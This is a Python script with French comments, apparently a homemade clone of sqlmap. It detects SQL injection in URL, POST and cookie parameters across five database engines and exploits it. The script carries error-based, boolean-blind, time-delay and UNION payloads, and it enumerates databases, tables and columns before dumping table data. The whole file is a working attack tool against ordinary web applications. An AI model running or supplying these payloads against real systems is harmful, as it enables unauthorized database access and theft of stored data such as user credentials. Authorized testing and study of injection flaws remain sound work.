#!/usr/bin/env python3
"""
minisqlmap.py — détecteur / exploiteur d'injections SQL façon sqlmap.

Techniques : error-based, boolean-based blind, time-based blind, UNION-based.
SGBD : MySQL, PostgreSQL, MSSQL, Oracle, SQLite.

Exemples :
  python minisqlmap.py -u "http://site.com/art.php?id=1"
  python minisqlmap.py -u "http://site.com/login" --data "u=admin&p=1" --dbs
  python minisqlmap.py -u "http://site.com/x?id=1*" -D db -T users --dump
"""

import argparse
import hashlib
import json
import re
import sys
import time
import urllib.parse

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("Manquant : pip install requests")
    sys.exit(1)


# ============================================================
#  Signatures d'erreurs -> SGBD
# ============================================================
ERROR_SIGNS = {
    "MySQL": ["you have an error in your sql syntax", "warning: mysql",
              "mysql_fetch", "mysql_num_rows", "check the manual that corresponds",
              "supplied argument is not a valid mysql"],
    "PostgreSQL": ["pg_query", "postgresql", "pg_exec", "psql:",
                   "unterminated quoted string", "invalid input syntax"],
    "MSSQL": ["microsoft ole db", "odbc sql server", "sqlserver",
              "unclosed quotation mark", "mssql_query", "incorrect syntax near"],
    "Oracle": ["ora-0", "oracle error", "quoted string not properly terminated",
               "oracle.jdbc"],
    "SQLite": ["sqlite", "sqlite3", "unrecognized token", "no such table"],
}

# Concaténation de chaînes par SGBD
CONCAT = {
    "MySQL": "CONCAT({a},{b},{c})",
    "PostgreSQL": "{a}||{b}||{c}",
    "MSSQL": "{a}+{b}+{c}",
    "Oracle": "{a}||{b}||{c}",
    "SQLite": "{a}||{b}||{c}",
}

# Expressions de version / user / base
META = {
    "MySQL": {"version": "@@version", "user": "current_user()", "db": "database()"},
    "PostgreSQL": {"version": "version()", "user": "current_user", "db": "current_database()"},
    "MSSQL": {"version": "@@version", "user": "system_user", "db": "db_name()"},
    "Oracle": {"version": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
               "user": "user", "db": "(SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL)"},
    "SQLite": {"version": "sqlite_version()", "user": "'sqlite'", "db": "'main'"},
}

# Requêtes d'énumération
ENUM = {
    "MySQL": {
        "dbs": "SELECT schema_name FROM information_schema.schemata",
        "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
        "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
    },
    "PostgreSQL": {
        "dbs": "SELECT datname FROM pg_database",
        "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
        "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
    },
    "MSSQL": {
        "dbs": "SELECT name FROM master..sysdatabases",
        "tables": "SELECT name FROM sysobjects WHERE xtype='U'",
        "columns": "SELECT name FROM syscolumns WHERE id=OBJECT_ID('{table}')",
    },
    "SQLite": {
        "dbs": "SELECT 'main'",
        "tables": "SELECT name FROM sqlite_master WHERE type='table'",
        "columns": "SELECT name FROM pragma_table_info('{table}')",
    },
    "Oracle": {
        "dbs": "SELECT username FROM all_users",
        "tables": "SELECT table_name FROM all_tables",
        "columns": "SELECT column_name FROM all_tab_columns WHERE table_name='{table}'",
    },
}

MARKER = "QHXQ"


def log(m, level="info"):
    c = {"info": "\033[0m", "good": "\033[92m", "warn": "\033[93m", "err": "\033[91m"}
    print(f"{c.get(level,'')}[*] {m}\033[0m", flush=True)


# ============================================================
#  Cible HTTP
# ============================================================
class Target:
    def __init__(self, args):
        self.url = args.url
        self.method = (args.method or "GET").upper()
        self.data = args.data or ""
        self.headers = {}
        for h in (args.header or []):
            if ":" in h:
                k, v = h.split(":", 1)
                self.headers[k.strip()] = v.strip()
        if args.agent:
            self.headers["User-Agent"] = args.agent
        self.cookies = {}
        for c in (args.cookie or []):
            if "=" in c:
                k, v = c.split("=", 1)
                self.cookies[k.strip()] = v.strip()
        self.timeout = args.timeout
        self.sess = requests.Session()
        self.baseline = None

    def build(self, param, location, value):
        url = self.url
        data = self.data
        cookies = dict(self.cookies)
        if location == "query":
            parts = urllib.parse.urlparse(url)
            q = dict(urllib.parse.parse_qsl(parts.query, keep_blank_values=True))
            q[param] = value
            url = urllib.parse.urlunparse(
                parts._replace(query=urllib.parse.urlencode(q)))
        elif location == "data":
            d = dict(urllib.parse.parse_qsl(data, keep_blank_values=True))
            d[param] = value
            data = urllib.parse.urlencode(d)
        elif location == "cookie":
            cookies[param] = value
        return url, data, cookies

    def send(self, param=None, location=None, value=None, verbose=False):
        url, data, cookies = self.url, self.data, dict(self.cookies)
        if param is not None:
            url, data, cookies = self.build(param, location, value)
        t0 = time.time()
        if self.method == "POST":
            r = self.sess.post(url, data=data, headers=self.headers,
                               cookies=cookies, timeout=self.timeout, verify=False)
        else:
            r = self.sess.get(url, headers=self.headers,
                              cookies=cookies, timeout=self.timeout, verify=False)
        dt = time.time() - t0
        if verbose:
            log(f"{dt:.2f}s  {url}  {data}", "info")
        return r.text, dt


def signature(text):
    return hashlib.md5(re.sub(r"\s+", " ", text).encode()).hexdigest()


# ============================================================
#  Détection
# ============================================================
class Detector:
    def __init__(self, target, args):
        self.t = target
        self.args = args
        self.param = None
        self.location = None
        self.technique = None
        self.dbms = None
        self.time_sec = args.time_sec
        self.base_text = None
        self.base_sig = None
        self.base_len = None

    # --- collecte des points d'injection ---
    def candidates(self):
        out = []
        if "*" in self.t.url:
            out.append(("MARK", "query"))
        else:
            qs = urllib.parse.urlparse(self.t.url).query
            for k in urllib.parse.parse_qsl(qs, keep_blank_values=True):
                out.append((k[0], "query"))
        if self.t.data:
            for k in urllib.parse.parse_qsl(self.t.data, keep_blank_values=True):
                out.append((k[0], "data"))
        for k in self.t.cookies:
            out.append((k, "cookie"))
        return out

    def baseline(self, param, location):
        txt, _ = self.t.send()
        self.base_text = txt
        self.base_sig = signature(txt)
        self.base_len = len(txt)

    # --- 1. error-based ---
    def check_error(self, param, location):
        for suffix in ["'", '"', "')", "';"]:
            txt, _ = self.t.send(param, location,
                                 self.original(param, location) + suffix)
            low = txt.lower()
            for dbms, signs in ERROR_SIGNS.items():
                if any(s in low for s in signs):
                    if signature(txt) != self.base_sig:
                        return dbms, suffix
        return None, None

    def original(self, param, location):
        if location == "query":
            qs = urllib.parse.urlparse(self.t.url).query
            return dict(urllib.parse.parse_qsl(qs, keep_blank_values=True)).get(param, "")
        if location == "data":
            return dict(urllib.parse.parse_qsl(self.t.data, keep_blank_values=True)).get(param, "")
        return self.t.cookies.get(param, "")

    # --- 2. boolean-based ---
    def check_boolean(self, param, location):
        base = self.original(param, location)
        pairs = [(" AND 1=1-- -", " AND 1=2-- -"),
                 (" AND '1'='1", " AND '1'='2"),
                 (" AND 1=1#", " AND 1=2#")]
        for true_s, false_s in pairs:
            t1, _ = self.t.send(param, location, base + true_s)
            t2, _ = self.t.send(param, location, base + false_s)
            if signature(t1) != signature(t2):
                # vérifier la stabilité
                t1b, _ = self.t.send(param, location, base + true_s)
                if signature(t1) == signature(t1b):
                    return true_s, false_s
        return None, None

    # --- 3. time-based ---
    def check_time(self, param, location):
        base = self.original(param, location)
        sleeps = {
            "MySQL": f" AND SLEEP({self.time_sec})-- -",
            "PostgreSQL": f" AND 1=(SELECT 1 FROM PG_SLEEP({self.time_sec}))-- -",
            "MSSQL": f"; WAITFOR DELAY '0:0:{self.time_sec}'-- -",
            "Oracle": f" AND 1=dbms_pipe.receive_message(('a'),{self.time_sec})-- -",
            "SQLite": f" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(30000000))))-- -",
        }
        for dbms, suffix in sleeps.items():
            _, dt = self.t.send(param, location, base + suffix)
            if dt >= self.time_sec * 0.8:
                _, dt2 = self.t.send(param, location, base + " AND 1=1-- -")
                if dt2 < self.time_sec * 0.5:
                    return dbms, suffix
        return None, None

    # --- fingerprint passif (erreurs) ---
    def fingerprint(self, param, location):
        base = self.original(param, location)
        for dbms, signs in ERROR_SIGNS.items():
            for suffix in ["'", "')", "\"", " AND 1=1"]:
                txt, _ = self.t.send(param, location, base + suffix)
                low = txt.lower()
                if any(s in low for s in signs):
                    return dbms
        return None

    def run(self):
        log(f"Test de {self.t.url}")
        for param, location in self.candidates():
            if param == "MARK":
                param = [k for k, _ in
                         urllib.parse.parse_qsl(urllib.parse.urlparse(self.t.url).query,
                                                keep_blank_values=True)][0]
            self.baseline(param, location)
            log(f"Paramètre '{param}' ({location})...")

            dbms, suffix = self.check_error(param, location)
            if dbms:
                log(f"ERREUR SQL détectée — SGBD probable : {dbms}", "good")
                self.param, self.location, self.technique, self.dbms = param, location, "error", dbms
                return True

            true_s, false_s = self.check_boolean(param, location)
            if true_s:
                log(f"injection BOOLEAN-based blind", "good")
                self.param, self.location, self.technique = param, location, "boolean"
                self.true_s, self.false_s = true_s, false_s
                self.dbms = self.fingerprint(param, location)
                return True

            dbms, suffix = self.check_time(param, location)
            if dbms:
                log(f"injection TIME-based blind — SGBD probable : {dbms}", "good")
                self.param, self.location, self.technique, self.dbms = param, location, "time", dbms
                self.time_suffix = suffix
                return True

            log("  pas d'injection évidente.")
        return False


# ============================================================
#  Moteur UNION / extraction
# ============================================================
class Union:
    def __init__(self, target, detector, args):
        self.t = target
        self.d = detector
        self.args = args
        self.cols = None
        self.out_col = None

    def inject(self, expr, suffix="-- -"):
        base = self.d.original(self.d.param, self.d.location)
        return self.t.send(self.d.param, self.d.location,
                           base + "' UNION SELECT " + expr + " " + suffix)[0]

    def find_columns(self):
        base = self.d.original(self.d.param, self.d.location)
        n = 1
        last_ok = 0
        for n in range(1, 21):
            txt, _ = self.t.send(self.d.param, self.d.location,
                                 base + f"' ORDER BY {n}-- -")
            if signature(txt) != self.d.base_sig:
                break
            last_ok = n
        if last_ok == 0:
            return None
        self.cols = last_ok
        return last_ok

    def find_output_column(self):
        exprs = ["NULL"] * self.cols
        for i in range(self.cols):
            e = list(exprs)
            e[i] = f"0x{MARKER.encode().hex()}"
            txt = self.inject(",".join(e))
            if MARKER in txt:
                self.out_col = i
                return i
        return None

    def extract(self, expr):
        """Extrait la valeur de `expr` via UNION."""
        if self.out_col is None:
            return None
        e = ["NULL"] * self.cols
        c = CONCAT[self.d.dbms]
        e[self.out_col] = c.format(a=f"0x{MARKER.encode().hex()}",
                                   b=expr, c=f"0x{MARKER.encode().hex()}")
        txt = self.inject(",".join(e))
        m = re.search(re.escape(MARKER) + r"(.*?)" + re.escape(MARKER), txt, re.S)
        return m.group(1).strip() if m else None

    def setup(self):
        if self.d.technique == "error" and not self.d.dbms:
            self.d.dbms = self.d.fingerprint(self.d.param, self.d.location)
        if not self.d.dbms:
            log("SGBD indéterminé, énumération limitée.", "warn")
            return False
        log(f"Recherche du nombre de colonnes (UNION)...")
        n = self.find_columns()
        if not n:
            log("UNION non exploitable (essai aveugle impossible).", "warn")
            return False
        log(f"{n} colonne(s) — recherche de la colonne de sortie...", "good")
        if self.find_output_column() is None:
            log("Aucune colonne string exploitable.", "warn")
            return False
        log(f"colonne {self.out_col + 1} utilisable pour l'exfiltration.", "good")
        return True


# ============================================================
#  Énumération
# ============================================================
def enumerate_all(u, d, args):
    dbms = d.dbms
    log(f"Bannière : {u.extract(META[dbms]['version'])}")
    log(f"Utilisateur : {u.extract(META[dbms]['user'])}")
    log(f"Base courante : {u.extract(META[dbms]['db'])}")

    if args.dbs:
        q = ENUM[dbms]["dbs"]
        res = u.extract(q)
        log(f"Bases : {res}", "good")
        return

    if args.tables or args.dump:
        db = args.db or u.extract(META[dbms]["db"])
        q = ENUM[dbms]["tables"].format(db=db)
        res = u.extract(q)
        log(f"Tables ({db}) : {res}", "good")
        if args.dump and args.table:
            cols = u.extract(ENUM[dbms]["columns"].format(table=args.table))
            log(f"Colonnes ({args.table}) : {cols}", "good")
            collist = (args.columns.split(",") if args.columns
                       else (cols or "").split(","))
            collist = [c for c in collist if c]
            if collist:
                sel = ",".join(f"IFNULL(CAST({c} AS CHAR),0x20)" if dbms == "MySQL"
                               else f"COALESCE(CAST({c} AS TEXT),'')" for c in collist)
                sep = "0x7c" if dbms == "MySQL" else "'|'"
                expr = f"(SELECT GROUP_CONCAT({sel} SEPARATOR {sep}) FROM {args.table})" \
                    if dbms in ("MySQL", "SQLite") else \
                    f"(SELECT STRING_AGG(CAST({sel} AS TEXT),'|') FROM {args.table})"
                data = u.extract(expr)
                log(f"Données de {args.table} :", "good")
                print("\n".join(f"    {r}" for r in (data or "").split("|")))


def main():
    p = argparse.ArgumentParser(description="minisqlmap — injecteur SQL")
    p.add_argument("-u", "--url", required=True, help="URL (ajoutez * sur le point d'injection)")
    p.add_argument("--data", help="corps POST")
    p.add_argument("--method", default="GET")
    p.add_argument("--cookie", action="append", help="cookie name=value")
    p.add_argument("--header", action="append", help="en-tête 'Nom: valeur'")
    p.add_argument("--agent", help="User-Agent")
    p.add_argument("--timeout", type=float, default=10)
    p.add_argument("--time-sec", type=int, default=3, help="délai time-based")
    p.add_argument("--dbs", action="store_true", help="lister les bases")
    p.add_argument("--tables", action="store_true", help="lister les tables")
    p.add_argument("--columns", help="colonnes à dumper")
    p.add_argument("-D", "--db", help="base")
    p.add_argument("-T", "--table", help="table")
    p.add_argument("--dump", action="store_true", help="dumper les données")
    args = p.parse_args()

    t = Target(args)
    det = Detector(t, args)
    if not det.run():
        log("Aucune injection trouvée.", "warn")
        sys.exit(0)

    u = Union(t, det, args)
    if u.setup():
        enumerate_all(u, det, args)


if __name__ == "__main__":
    main()